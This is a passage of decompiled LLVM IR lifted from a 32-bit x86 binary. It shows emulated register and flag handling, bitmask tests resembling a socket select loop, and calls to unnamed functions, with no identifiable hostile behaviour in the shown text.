  store i32 %v12_8048cc0, i32* %v5_8048cc0, align 4
  %v0_8048cc8 = load i32, i32* @esi, align 4
  %v1_8048cc8 = add i32 %v0_8048cc8, -1440
  %v2_8048cc8 = inttoptr i32 %v1_8048cc8 to i32*
  %v3_8048cc8 = load i32, i32* %v2_8048cc8, align 4
  store i32 %v3_8048cc8, i32* %eax.global-to-local, align 4
  %v0_8048cce = load i32, i32* @esp, align 4
  %v1_8048cce = add i32 %v0_8048cce, 72
  %v2_8048cce = inttoptr i32 %v1_8048cce to i32*
  %v3_8048cce = load i32, i32* %v2_8048cce, align 4
  %v5_8048cce = sub i32 %v3_8048cce, %v3_8048cc8
  %v11_8048cce = xor i32 %v3_8048cce, %v3_8048cc8
  %v12_8048cce = xor i32 %v5_8048cce, %v3_8048cce
  %v13_8048cce = and i32 %v12_8048cce, %v11_8048cce
  %v14_8048cce = icmp slt i32 %v13_8048cce, 0
  %v15_8048cce = icmp eq i32 %v5_8048cce, 0
  store i1 %v15_8048cce, i1* %zf.global-to-local, align 1
  %v16_8048cce = icmp slt i32 %v5_8048cce, 0
  %v2_8048cd2 = icmp eq i1 %v16_8048cce, %v14_8048cce
  br i1 %v2_8048cd2, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_8048cdd:                             ; preds = %dec_label_pc_8048582
  %v1_8048cdd = add i32 %v0_8048597, 72
  %v2_8048cdd = inttoptr i32 %v1_8048cdd to i32*
  %v3_8048cdd = load i32, i32* %v2_8048cdd, align 4
  store i32 %v3_8048cdd, i32* %eax.global-to-local, align 4
  %v1_8048ce1 = icmp eq i32 %v3_8048cdd, 0
  store i1 %v1_8048ce1, i1* %zf.global-to-local, align 1
  br i1 %v1_8048ce1, label %dec_label_pc_80484e5, label %dec_label_pc_8048ce9

dec_label_pc_8048ce9:                             ; preds = %dec_label_pc_8048cdd
  %v1_8048ce9 = add i32 %v0_8048597, 20888
  %v2_8048ce9 = inttoptr i32 %v1_8048ce9 to i32*
  store i32 0, i32* %v2_8048ce9, align 4
  %v0_8048cf4 = load i32, i32* @esp, align 4
  %v1_8048cf4 = add i32 %v0_8048cf4, 20884
  %v2_8048cf4 = inttoptr i32 %v1_8048cf4 to i32*
  store i32 1, i32* %v2_8048cf4, align 4
  %v0_8048cff = load i32, i32* @esp, align 4
  %v9_8048cff = icmp eq i32 %v0_8048cff, 12
  store i1 %v9_8048cff, i1* %zf.global-to-local, align 1
  %v1_8048d02 = add i32 %v0_8048cff, 20884
  store i32 %v1_8048d02, i32* %eax.global-to-local, align 4
  %v2_8048d09 = add i32 %v0_8048cff, -16
  %v3_8048d09 = inttoptr i32 %v2_8048d09 to i32*
  store i32 %v1_8048d02, i32* %v3_8048d09, align 4
  %v1_8048d0a = add i32 %v0_8048cff, -20
  %v2_8048d0a = inttoptr i32 %v1_8048d0a to i32*
  store i32 0, i32* %v2_8048d0a, align 4
  %v1_8048d0c = add i32 %v0_8048cff, 20612
  store i32 %v1_8048d0c, i32* %edx.global-to-local, align 4
  %v2_8048d13 = add i32 %v0_8048cff, -24
  %v3_8048d13 = inttoptr i32 %v2_8048d13 to i32*
  store i32 %v1_8048d0c, i32* %v3_8048d13, align 4
  %v1_8048d14 = add i32 %v0_8048cff, 20740
  store i32 %v1_8048d14, i32* %ecx.global-to-local, align 4
  %v2_8048d1b = add i32 %v0_8048cff, -28
  %v3_8048d1b = inttoptr i32 %v2_8048d1b to i32*
  store i32 %v1_8048d14, i32* %v3_8048d1b, align 4
  %v1_8048d1c = add i32 %v0_8048cff, 72
  %v2_8048d1c = inttoptr i32 %v1_8048d1c to i32*
  %v3_8048d1c = load i32, i32* %v2_8048d1c, align 4
  store i32 %v3_8048d1c, i32* %eax.global-to-local, align 4
  %v2_8048d20 = add i32 %v0_8048cff, -32
  %v3_8048d20 = inttoptr i32 %v2_8048d20 to i32*
  store i32 %v3_8048d1c, i32* %v3_8048d20, align 4
  %v0_8048d21 = call i32 @function_8052448()
  store i32 %v0_8048d21, i32* %eax.global-to-local, align 4
  %v0_8048d26 = load i32, i32* @esp, align 4
  %v9_8048d26 = icmp eq i32 %v0_8048d26, -20
  store i1 %v9_8048d26, i1* %zf.global-to-local, align 1
  store i32 %v0_8048d21, i32* @ebx, align 4
  %v1_8048d2b = add i32 %v0_8048d26, 16
  %v2_8048d2b = inttoptr i32 %v1_8048d2b to i32*
  store i32 0, i32* %v2_8048d2b, align 4
  %v2_8048d2d = call i32 @function_8052502(i32* %v1_80484ea)
  store i32 %v2_8048d2d, i32* %eax.global-to-local, align 4
  %v1_8048d32 = load i32, i32* @esp, align 4
  %v2_8048d32 = add i32 %v1_8048d32, 132
  %v3_8048d32 = inttoptr i32 %v2_8048d32 to i32*
  store i32 %v2_8048d2d, i32* %v3_8048d32, align 4
  %v0_8048d39 = load i32, i32* @esp, align 4
  %v1_8048d39 = add i32 %v0_8048d39, 16
  %v0_8048d3c = load i32, i32* @ebx, align 4
  %v1_8048d3c = icmp eq i32 %v0_8048d3c, 0
  store i1 %v1_8048d3c, i1* %zf.global-to-local, align 1
  %tmp141 = icmp slt i32 %v0_8048d3c, 1
  br i1 %tmp141, label %dec_label_pc_80484e5, label %dec_label_pc_8048d44

dec_label_pc_8048d44:                             ; preds = %dec_label_pc_8048ce9
  %v1_8048d44 = add i32 %v0_8048d39, 48
  %v2_8048d44 = inttoptr i32 %v1_8048d44 to i32*
  %v3_8048d44 = load i32, i32* %v2_8048d44, align 4
  store i32 %v3_8048d44, i32* %eax.global-to-local, align 4
  %v1_8048d48 = add i32 %v0_8048d39, 60
  %v2_8048d48 = inttoptr i32 %v1_8048d48 to i32*
  store i32 0, i32* %v2_8048d48, align 4
  %v0_8048d50 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8048d50, i32* %edx.global-to-local, align 4
  %v1_8048d52 = load i32, i32* @esp, align 4
  %v2_8048d52 = add i32 %v1_8048d52, 92
  %v3_8048d52 = inttoptr i32 %v2_8048d52 to i32*
  store i32 %v0_8048d50, i32* %v3_8048d52, align 4
  %v0_8048db9.pre = load i32, i32* @esp, align 4
  %v0_8048dbd.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8048db9

dec_label_pc_8048d58:                             ; preds = %dec_label_pc_8048dd2, %dec_label_pc_8048e2e
  %v1_8048e7a = phi i32 [ %v0_8048ddc, %dec_label_pc_8048dd2 ], [ %v0_8048d60.pre, %dec_label_pc_8048e2e ]
  %v0_8048d58 = phi i32 [ %v3_8048dc7, %dec_label_pc_8048dd2 ], [ %v0_8048d58.pre, %dec_label_pc_8048e2e ]
  %v2_8048d5a = udiv i32 %v0_8048d58, 32
  store i32 %v2_8048d5a, i32* %ecx.global-to-local, align 4
  %v1_8048d5d = urem i32 %v0_8048d58, 32
  store i32 %v1_8048d5d, i32* %eax.global-to-local, align 4
  %v2_8048d60 = mul nuw nsw i32 %v2_8048d5a, 4
  %v3_8048d60 = add i32 %v1_8048e7a, 20740
  %v4_8048d60 = add i32 %v3_8048d60, %v2_8048d60
  %v5_8048d60 = inttoptr i32 %v4_8048d60 to i32*
  %v6_8048d60 = load i32, i32* %v5_8048d60, align 4
  %v9_8048d60 = shl i32 1, %v1_8048d5d
  %v10_8048d60 = and i32 %v6_8048d60, %v9_8048d60
  %v11_8048d60 = icmp ne i32 %v10_8048d60, 0
  %v1_8048d68 = zext i1 %v11_8048d60 to i32
  store i32 %v1_8048d68, i32* %eax.global-to-local, align 4
  %v4_8048d6b = icmp eq i1 %v11_8048d60, false
  store i1 %v4_8048d6b, i1* %zf.global-to-local, align 1
  br i1 %v4_8048d6b, label %dec_label_pc_8048d91, label %dec_label_pc_8048d6f

dec_label_pc_8048d6f:                             ; preds = %dec_label_pc_8048d58
  %v1_8048d6f = add i32 %v1_8048e7a, 92
  %v2_8048d6f = inttoptr i32 %v1_8048d6f to i32*
  %v3_8048d6f = load i32, i32* %v2_8048d6f, align 4
  store i32 %v3_8048d6f, i32* %edx.global-to-local, align 4
  %v1_8048d73 = add i32 %v3_8048d6f, -1448
  %v2_8048d73 = inttoptr i32 %v1_8048d73 to i8*
  %v3_8048d73 = load i8, i8* %v2_8048d73, align 1
  %v4_8048d73 = zext i8 %v3_8048d73 to i32
  store i32 %v4_8048d73, i32* @eax, align 4
  %v10_8048d79 = icmp eq i8 %v3_8048d73, 6
  store i1 %v10_8048d79, i1* %zf.global-to-local, align 1
  br i1 %v10_8048d79, label %dec_label_pc_8048e7a, label %dec_label_pc_8048d81

dec_label_pc_8048d81:                             ; preds = %dec_label_pc_8048d6f
  %v10_8048d81 = icmp eq i8 %v3_8048d73, 7
  store i1 %v10_8048d81, i1* %zf.global-to-local, align 1
  br i1 %v10_8048d81, label %dec_label_pc_80494af, label %dec_label_pc_8048d89

dec_label_pc_8048d89:                             ; preds = %dec_label_pc_8048d81
  %v10_8048d89 = icmp eq i8 %v3_8048d73, 10
  store i1 %v10_8048d89, i1* %zf.global-to-local, align 1
  br i1 %v10_8048d89, label %dec_label_pc_80497b3, label %dec_label_pc_8048d91

dec_label_pc_8048d91:                             ; preds = %dec_label_pc_80495e0, %dec_label_pc_8049b0f, %dec_label_pc_8049c31, %dec_label_pc_8049ae5, %dec_label_pc_8048d89, %dec_label_pc_8048d58, %dec_label_pc_8048db9, %dec_label_pc_8049e5a, %dec_label_pc_8049c42, %dec_label_pc_8049af8, %dec_label_pc_8049abf, %dec_label_pc_8049a49, %dec_label_pc_80497f9, %dec_label_pc_804949f, %dec_label_pc_8048e4a, %dec_label_pc_80496c3
  %v0_8048d91 = load i32, i32* @esp, align 4
  %v1_8048d91 = add i32 %v0_8048d91, 44
  %v2_8048d91 = inttoptr i32 %v1_8048d91 to i32*
  %v3_8048d91 = load i32, i32* %v2_8048d91, align 4
  store i32 %v3_8048d91, i32* %edx.global-to-local, align 4
  %v1_8048d95 = add i32 %v0_8048d91, 92
  %v2_8048d95 = inttoptr i32 %v1_8048d95 to i32*
  %v3_8048d95 = load i32, i32* %v2_8048d95, align 4
  %v1_8048d99 = add i32 %v3_8048d95, 3140
  store i32 %v1_8048d99, i32* %eax.global-to-local, align 4
  %v1_8048d9e = add i32 %v3_8048d91, 1
  store i32 %v1_8048d9e, i32* %edx.global-to-local, align 4
  store i32 %v1_8048d9e, i32* %v2_8048d91, align 4
  %v0_8048da3 = load i32, i32* %eax.global-to-local, align 4
  %v1_8048da3 = load i32, i32* @esp, align 4
  %v2_8048da3 = add i32 %v1_8048da3, 92
  %v3_8048da3 = inttoptr i32 %v2_8048da3 to i32*
  store i32 %v0_8048da3, i32* %v3_8048da3, align 4
  %v0_8048da7 = load i32, i32* @esp, align 4
  %v1_8048da7 = add i32 %v0_8048da7, 112
  %v2_8048da7 = inttoptr i32 %v1_8048da7 to i32*
  %v3_8048da7 = load i32, i32* %v2_8048da7, align 4
  store i32 %v3_8048da7, i32* %eax.global-to-local, align 4
  %v1_8048dab = add i32 %v0_8048da7, 44
  %v2_8048dab = inttoptr i32 %v1_8048dab to i32*
  %v3_8048dab = load i32, i32* %v2_8048dab, align 4
  %v15_8048dab = icmp eq i32 %v3_8048dab, %v3_8048da7
  store i1 %v15_8048dab, i1* %zf.global-to-local, align 1
  br i1 %v15_8048dab, label %dec_label_pc_80484e5, label %dec_label_pc_8048db5

dec_label_pc_8048db5:                             ; preds = %dec_label_pc_8048d91
  %v1_8048db5 = add i32 %v0_8048da7, 92
  %v2_8048db5 = inttoptr i32 %v1_8048db5 to i32*
  %v3_8048db5 = load i32, i32* %v2_8048db5, align 4
  store i32 %v3_8048db5, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8048db9

dec_label_pc_8048db9:                             ; preds = %dec_label_pc_8048d44, %dec_label_pc_8048db5
  %v0_8048dbd = phi i32 [ %v0_8048dbd.pre, %dec_label_pc_8048d44 ], [ %v3_8048db5, %dec_label_pc_8048db5 ]
  %v1_8048dc3 = phi i32 [ %v0_8048db9.pre, %dec_label_pc_8048d44 ], [ %v0_8048da7, %dec_label_pc_8048db5 ]
  %v1_8048db9 = add i32 %v1_8048dc3, 92
  %v2_8048db9 = inttoptr i32 %v1_8048db9 to i32*
  %v3_8048db9 = load i32, i32* %v2_8048db9, align 4
  store i32 %v3_8048db9, i32* %eax.global-to-local, align 4
  %v1_8048dbd = add i32 %v0_8048dbd, -1452
  store i32 %v1_8048dbd, i32* %edx.global-to-local, align 4
  %v2_8048dc3 = add i32 %v1_8048dc3, 76
  %v3_8048dc3 = inttoptr i32 %v2_8048dc3 to i32*
  store i32 %v1_8048dbd, i32* %v3_8048dc3, align 4
  %v0_8048dc7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8048dc7 = add i32 %v0_8048dc7, -1452
  %v2_8048dc7 = inttoptr i32 %v1_8048dc7 to i32*
  %v3_8048dc7 = load i32, i32* %v2_8048dc7, align 4
  store i32 %v3_8048dc7, i32* %ecx.global-to-local, align 4
  %v10_8048dcd = icmp eq i32 %v3_8048dc7, -1
  store i1 %v10_8048dcd, i1* %zf.global-to-local, align 1
  br i1 %v10_8048dcd, label %dec_label_pc_8048d91, label %dec_label_pc_8048dd2

dec_label_pc_8048dd2:                             ; preds = %dec_label_pc_8048db9
  %v2_8048dd6 = udiv i32 %v3_8048dc7, 32
  store i32 %v2_8048dd6, i32* %edx.global-to-local, align 4
  %v1_8048dd9 = urem i32 %v3_8048dc7, 32
  store i32 %v1_8048dd9, i32* %eax.global-to-local, align 4
  %v0_8048ddc = load i32, i32* @esp, align 4
  %v2_8048ddc = mul nuw nsw i32 %v2_8048dd6, 4
  %v3_8048ddc = add nuw nsw i32 %v2_8048ddc, 20612
  %v4_8048ddc = add i32 %v3_8048ddc, %v0_8048ddc
  %v5_8048ddc = inttoptr i32 %v4_8048ddc to i32*
  %v6_8048ddc = load i32, i32* %v5_8048ddc, align 4
  %v9_8048ddc = shl i32 1, %v1_8048dd9
  %v10_8048ddc = and i32 %v6_8048ddc, %v9_8048ddc
  %v11_8048ddc = icmp ne i32 %v10_8048ddc, 0
  %v1_8048de4 = zext i1 %v11_8048ddc to i32
  store i32 %v1_8048de4, i32* %eax.global-to-local, align 4
  %v4_8048de7 = icmp eq i1 %v11_8048ddc, false
  store i1 %v4_8048de7, i1* %zf.global-to-local, align 1
  br i1 %v4_8048de7, label %dec_label_pc_8048d58, label %dec_label_pc_8048def

dec_label_pc_8048def:                             ; preds = %dec_label_pc_8048dd2
  %v1_8048def = add i32 %v0_8048ddc, 20896
  %v2_8048def = inttoptr i32 %v1_8048def to i32*
  store i32 0, i32* %v2_8048def, align 4
  %v0_8048dfa = load i32, i32* @esp, align 4
  %v1_8048dfa = add i32 %v0_8048dfa, 20892
  %v2_8048dfa = inttoptr i32 %v1_8048dfa to i32*
  store i32 4, i32* %v2_8048dfa, align 4
  %v0_8048e05 = load i32, i32* @esp, align 4
  %v9_8048e05 = icmp eq i32 %v0_8048e05, 12
  store i1 %v9_8048e05, i1* %zf.global-to-local, align 1
  %v1_8048e08 = add i32 %v0_8048e05, 20892
  store i32 %v1_8048e08, i32* %edx.global-to-local, align 4
  %v2_8048e0f = add i32 %v0_8048e05, -16
  %v3_8048e0f = inttoptr i32 %v2_8048e0f to i32*
  store i32 %v1_8048e08, i32* %v3_8048e0f, align 4
  %v1_8048e10 = add i32 %v0_8048e05, 20896
  store i32 %v1_8048e10, i32* %eax.global-to-local, align 4
  %v2_8048e17 = add i32 %v0_8048e05, -20
  %v3_8048e17 = inttoptr i32 %v2_8048e17 to i32*
  store i32 %v1_8048e10, i32* %v3_8048e17, align 4
  %v1_8048e18 = add i32 %v0_8048e05, -24
  %v2_8048e18 = inttoptr i32 %v1_8048e18 to i32*
  store i32 4, i32* %v2_8048e18, align 4
  %v1_8048e1a = add i32 %v0_8048e05, -28
  %v2_8048e1a = inttoptr i32 %v1_8048e1a to i32*
  store i32 1, i32* %v2_8048e1a, align 4
  %v0_8048e1c = load i32, i32* %ecx.global-to-local, align 4
  %v2_8048e1c = add i32 %v0_8048e05, -32
  %v3_8048e1c = inttoptr i32 %v2_8048e1c to i32*
  store i32 %v0_8048e1c, i32* %v3_8048e1c, align 4
  %v0_8048e1d = call i32 @function_80528b0()
  store i32 %v0_8048e1d, i32* %eax.global-to-local, align 4
  %v0_8048e22 = load i32, i32* @esp, align 4
  %v1_8048e22 = add i32 %v0_8048e22, 32
  %v2_8048e25 = add i32 %v0_8048e22, 20928
  %v3_8048e25 = inttoptr i32 %v2_8048e25 to i32*
  %v4_8048e25 = load i32, i32* %v3_8048e25, align 4
  %v5_8048e25 = or i32 %v4_8048e25, %v0_8048e1d
  %v6_8048e25 = icmp eq i32 %v5_8048e25, 0
  store i1 %v6_8048e25, i1* %zf.global-to-local, align 1
  store i32 %v5_8048e25, i32* %eax.global-to-local, align 4
  %v1_8048e2c = icmp eq i1 %v6_8048e25, false
  br i1 %v1_8048e2c, label %dec_label_pc_8048e4a, label %dec_label_pc_8048e2e

dec_label_pc_8048e2e:                             ; preds = %dec_label_pc_8048def
  %v1_8048e2e = add i32 %v0_8048e22, 124
  %v2_8048e2e = inttoptr i32 %v1_8048e2e to i32*
  %v3_8048e2e = load i32, i32* %v2_8048e2e, align 4
  store i32 %v3_8048e2e, i32* %edx.global-to-local, align 4
  %v1_8048e32 = add i32 %v3_8048e2e, -1452
  %v2_8048e32 = inttoptr i32 %v1_8048e32 to i32*
  %v3_8048e32 = load i32, i32* %v2_8048e32, align 4
  store i32 %v3_8048e32, i32* %ecx.global-to-local, align 4
  %v1_8048e38 = add i32 %v3_8048e2e, -1448
  %v2_8048e38 = inttoptr i32 %v1_8048e38 to i8*
  store i8 4, i8* %v2_8048e38, align 1
  %v0_8048d58.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_8048d60.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048d58

dec_label_pc_8048e44:                             ; preds = %dec_label_pc_80494dc
  %v0_8048e44 = load i32, i32* @edi, align 4
  %v1_8048e44 = inttoptr i32 %v0_8048e44 to i32*
  store i32 104, i32* %v1_8048e44, align 4
  %v0_8048e4a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048e4a

dec_label_pc_8048e4a:                             ; preds = %dec_label_pc_8049b0f, %dec_label_pc_8048e7a, %dec_label_pc_8048def, %dec_label_pc_8048e44
  %v0_8048e4a = phi i32 [ %v1_804950d, %dec_label_pc_8049b0f ], [ %v1_8048eb7, %dec_label_pc_8048e7a ], [ %v1_8048e22, %dec_label_pc_8048def ], [ %v0_8048e4a.pre, %dec_label_pc_8048e44 ]
  %v9_8048e4a = icmp eq i32 %v0_8048e4a, 12
  store i1 %v9_8048e4a, i1* %zf.global-to-local, align 1
  %v1_8048e4d = add i32 %v0_8048e4a, 92
  %v2_8048e4d = inttoptr i32 %v1_8048e4d to i32*
  %v3_8048e4d = load i32, i32* %v2_8048e4d, align 4
  store i32 %v3_8048e4d, i32* %ecx.global-to-local, align 4
  %v1_8048e51 = add i32 %v3_8048e4d, -1452
  %v2_8048e51 = inttoptr i32 %v1_8048e51 to i32*
  %v3_8048e51 = load i32, i32* %v2_8048e51, align 4
  store i32 %v3_8048e51, i32* @ebx, align 4
  %v2_8048e57 = add i32 %v0_8048e4a, -16
  %v3_8048e57 = inttoptr i32 %v2_8048e57 to i32*
  store i32 %v3_8048e51, i32* %v3_8048e57, align 4
  %v1_8048e58 = call i32 @function_8052241(i32 %stack_var_-20924.0.ph)
  store i32 %v1_8048e58, i32* %eax.global-to-local, align 4
  %v0_8048e5d = load i32, i32* @esp, align 4
  %v1_8048e5d = add i32 %v0_8048e5d, 108
  %v2_8048e5d = inttoptr i32 %v1_8048e5d to i32*
  %v3_8048e5d = load i32, i32* %v2_8048e5d, align 4
  store i32 %v3_8048e5d, i32* %eax.global-to-local, align 4
  %v6_8048e61 = icmp eq i32 %v0_8048e5d, -16
  store i1 %v6_8048e61, i1* %zf.global-to-local, align 1
  %v1_8048e64 = add i32 %v3_8048e5d, -1452
  %v2_8048e64 = inttoptr i32 %v1_8048e64 to i32*
  store i32 -1, i32* %v2_8048e64, align 4
  %v0_8048e6e = load i32, i32* %eax.global-to-local, align 4
  %v1_8048e6e = add i32 %v0_8048e6e, -1448
  %v2_8048e6e = inttoptr i32 %v1_8048e6e to i8*
  store i8 0, i8* %v2_8048e6e, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8048e7a:                             ; preds = %dec_label_pc_8048d6f
  %v2_8048e7a = add i32 %v1_8048e7a, -4
  %v3_8048e7a = inttoptr i32 %v2_8048e7a to i32*
  store i32 %v4_8048d73, i32* %v3_8048e7a, align 4
  %v0_8048e7b = load i32, i32* @eax, align 4
  %v2_8048e7b = add i32 %v1_8048e7a, -8
  %v3_8048e7b = inttoptr i32 %v2_8048e7b to i32*
  store i32 %v0_8048e7b, i32* %v3_8048e7b, align 4
  %v1_8048e7c = add i32 %v1_8048e7a, -12
  %v2_8048e7c = inttoptr i32 %v1_8048e7c to i32*
  store i32 10240, i32* %v2_8048e7c, align 4
  %v1_8048e81 = add i32 %v1_8048e7a, 131
  store i32 %v1_8048e81, i32* %ecx.global-to-local, align 4
  %v2_8048e88 = add i32 %v1_8048e7a, -16
  %v3_8048e88 = inttoptr i32 %v2_8048e88 to i32*
  store i32 %v1_8048e81, i32* %v3_8048e88, align 4
  %v2_8048e89 = call i32 @function_8051d30(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  %v0_8048e8e = load i32, i32* @esp, align 4
  %v1_8048e8e = add i32 %v0_8048e8e, -4
  %v2_8048e8e = inttoptr i32 %v1_8048e8e to i32*
  store i32 16386, i32* %v2_8048e8e, align 4
  %v1_8048e93 = add i32 %v0_8048e8e, -8
  %v2_8048e93 = inttoptr i32 %v1_8048e93 to i32*
  store i32 10240, i32* %v2_8048e93, align 4
  %v1_8048e98 = add i32 %v0_8048e8e, 147
  store i32 %v1_8048e98, i32* %eax.global-to-local, align 4
  %v2_8048e9f = add i32 %v0_8048e8e, -12
  %v3_8048e9f = inttoptr i32 %v2_8048e9f to i32*
  store i32 %v1_8048e98, i32* %v3_8048e9f, align 4
  %v1_8048ea0 = add i32 %v0_8048e8e, 108
  %v2_8048ea0 = inttoptr i32 %v1_8048ea0 to i32*
  %v3_8048ea0 = load i32, i32* %v2_8048ea0, align 4
  store i32 %v3_8048ea0, i32* %edx.global-to-local, align 4
  %v1_8048ea4 = add i32 %v3_8048ea0, -1452
  %v2_8048ea4 = inttoptr i32 %v1_8048ea4 to i32*
  %v3_8048ea4 = load i32, i32* %v2_8048ea4, align 4
  store i32 %v3_8048ea4, i32* %eax.global-to-local, align 4
  %v2_8048eaa = add i32 %v0_8048e8e, -16
  %v3_8048eaa = inttoptr i32 %v2_8048eaa to i32*
  store i32 %v3_8048ea4, i32* %v3_8048eaa, align 4
  %v0_8048eab = call i32 @function_805290e()
  store i32 %v0_8048eab, i32* %eax.global-to-local, align 4
  %v1_8048eb0 = load i32, i32* @esp, align 4
  %v2_8048eb0 = add i32 %v1_8048eb0, 136
  %v3_8048eb0 = inttoptr i32 %v2_8048eb0 to i32*
  store i32 %v0_8048eab, i32* %v3_8048eb0, align 4
  %v0_8048eb7 = load i32, i32* @esp, align 4
  %v1_8048eb7 = add i32 %v0_8048eb7, 32
  %v1_8048eba = icmp eq i32 %v0_8048eab, 0
  store i1 %v1_8048eba, i1* %zf.global-to-local, align 1
  %tmp142 = icmp slt i32 %v0_8048eab, 1
  br i1 %tmp142, label %dec_label_pc_8048e4a, label %dec_label_pc_8048ebe

dec_label_pc_8048ebe:                             ; preds = %dec_label_pc_8048e7a
  %v1_8048ebe = add i32 %v0_8048eb7, 28
  %v2_8048ebe = inttoptr i32 %v1_8048ebe to i32*
  store i32 4, i32* %v2_8048ebe, align 4
  %v1_8048ec0 = add i32 %v0_8048eb7, 24
  %v2_8048ec0 = inttoptr i32 %v1_8048ec0 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8054b64.13 to i32), i32* %v2_8048ec0, align 4
  %v1_8048ec5 = add i32 %v0_8048eb7, 136
  %v2_8048ec5 = inttoptr i32 %v1_8048ec5 to i32*
  %v3_8048ec5 = load i32, i32* %v2_8048ec5, align 4
  store i32 %v3_8048ec5, i32* %eax.global-to-local, align 4
  %v2_8048ec9 = add i32 %v0_8048eb7, 20
  %v3_8048ec9 = inttoptr i32 %v2_8048ec9 to i32*
  store i32 %v3_8048ec5, i32* %v3_8048ec9, align 4
  %v1_8048eca = add i32 %v0_8048eb7, 163
  store i32 %v1_8048eca, i32* %edx.global-to-local, align 4
  %v2_8048ed1 = add i32 %v0_8048eb7, 16
  %v3_8048ed1 = inttoptr i32 %v2_8048ed1 to i32*
  store i32 %v1_8048eca, i32* %v3_8048ed1, align 4
  %v0_8048ed2 = call i32 @function_8051d50()
  %v0_8048ed7 = load i32, i32* @esp, align 4
  %v1_8048eda = add i32 %v0_8048ed2, 1
  %v8_8048eda = icmp eq i32 %v1_8048eda, 0
  store i1 %v8_8048eda, i1* %zf.global-to-local, align 1
  store i32 %v1_8048eda, i32* %eax.global-to-local, align 4
  %v1_8049ae5 = add i32 %v0_8048ed7, 120
  %v2_8049ae5 = inttoptr i32 %v1_8049ae5 to i32*
  br i1 %v8_8048eda, label %dec_label_pc_8049ae5, label %dec_label_pc_8048ee1

dec_label_pc_8048ee1:                             ; preds = %dec_label_pc_8048ebe, %dec_label_pc_8049ae5
  %v1_8048ee1 = add i32 %v0_8048ed7, 12
  %v2_8048ee1 = inttoptr i32 %v1_8048ee1 to i32*
  store i32 4, i32* %v2_8048ee1, align 4
  %v1_8048ee3 = add i32 %v0_8048ed7, 8
  %v2_8048ee3 = inttoptr i32 %v1_8048ee3 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8054b64.13 to i32), i32* %v2_8048ee3, align 4
  %v3_8048ee8 = load i32, i32* %v2_8049ae5, align 4
  %v2_8048eec = add i32 %v0_8048ed7, 4
  %v3_8048eec = inttoptr i32 %v2_8048eec to i32*
  store i32 %v3_8048ee8, i32* %v3_8048eec, align 4
  %v1_8048eed = add i32 %v0_8048ed7, 147
  store i32 %v1_8048eed, i32* %ecx.global-to-local, align 4
  %v3_8048ef4 = inttoptr i32 %v0_8048ed7 to i32*
  store i32 %v1_8048eed, i32* %v3_8048ef4, align 4
  %v0_8048ef5 = call i32 @function_8051d50()
  store i32 %v0_8048ef5, i32* %eax.global-to-local, align 4
  %v0_8048efa = load i32, i32* @esp, align 4
  %v2_8048efa = add i32 %v0_8048ef5, 147
  %v3_8048efa = add i32 %v2_8048efa, %v0_8048efa
  %v4_8048efa = inttoptr i32 %v3_8048efa to i8*
  store i8 0, i8* %v4_8048efa, align 1
  %v0_8048f02 = load i32, i32* @esp, align 4
  %v1_8048f02 = inttoptr i32 %v0_8048f02 to i32*
  %v3_8048f02 = add i32 %v0_8048f02, 4
  %v1_8048f03 = inttoptr i32 %v3_8048f02 to i32*
  %v2_8048f03 = load i32, i32* %v1_8048f03, align 4
  store i32 %v2_8048f03, i32* @edi, align 4
  store i32 0, i32* %v1_8048f03, align 4
  store i32 46, i32* %v1_8048f02, align 4
  %v3_8048f08 = call i32 @function_80512a0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048f08, i32* %eax.global-to-local, align 4
  %v0_8048f0d = load i32, i32* @esp, align 4
  %v9_8048f0d = icmp eq i32 %v0_8048f0d, -12
  store i1 %v9_8048f0d, i1* %zf.global-to-local, align 1
  %v2_8048f10 = add i32 %v0_8048f0d, 8
  %v3_8048f10 = inttoptr i32 %v2_8048f10 to i32*
  store i32 %v3_8048f08, i32* %v3_8048f10, align 4
  %v1_8048f11 = add i32 %v0_8048f0d, 120
  %v2_8048f11 = inttoptr i32 %v1_8048f11 to i32*
  %v3_8048f11 = load i32, i32* %v2_8048f11, align 4
  %v2_8048f15 = add i32 %v0_8048f0d, 4
  %v3_8048f15 = inttoptr i32 %v2_8048f15 to i32*
  store i32 %v3_8048f11, i32* %v3_8048f15, align 4
  %v1_8048f16 = add i32 %v0_8048f0d, 147
  store i32 %v1_8048f16, i32* %eax.global-to-local, align 4
  %v3_8048f1d = inttoptr i32 %v0_8048f0d to i32*
  store i32 %v1_8048f16, i32* %v3_8048f1d, align 4
  %v4_8048f1e = call i32 @function_8051f90(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8048f23 = load i32, i32* @esp, align 4
  %v1_8048f23 = add i32 %v0_8048f23, 16
  %v1_8048f26 = add i32 %v4_8048f1e, 1
  %v8_8048f26 = icmp eq i32 %v1_8048f26, 0
  store i1 %v8_8048f26, i1* %zf.global-to-local, align 1
  store i32 %v1_8048f26, i32* %eax.global-to-local, align 4
  br i1 %v8_8048f26, label %dec_label_pc_8048f33, label %dec_label_pc_8048f29

dec_label_pc_8048f29:                             ; preds = %dec_label_pc_8048ee1
  %v1_8048f29 = add i32 %v0_8048f23, 108
  %v2_8048f29 = inttoptr i32 %v1_8048f29 to i32*
  %v3_8048f29 = load i32, i32* %v2_8048f29, align 4
  store i32 %v3_8048f29, i32* %edx.global-to-local, align 4
  %v1_8048f2d = inttoptr i32 %v3_8048f29 to i32*
  store i32 2, i32* %v1_8048f2d, align 4
  %v1_8048f33.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048f33

dec_label_pc_8048f33:                             ; preds = %dec_label_pc_8048ee1, %dec_label_pc_8048f29
  %v1_8048f33 = phi i32 [ %v1_8048f23, %dec_label_pc_8048ee1 ], [ %v1_8048f33.pre, %dec_label_pc_8048f29 ]
  %v0_8048f33 = load i32, i32* @ecx, align 4
  %v2_8048f33 = add i32 %v1_8048f33, -4
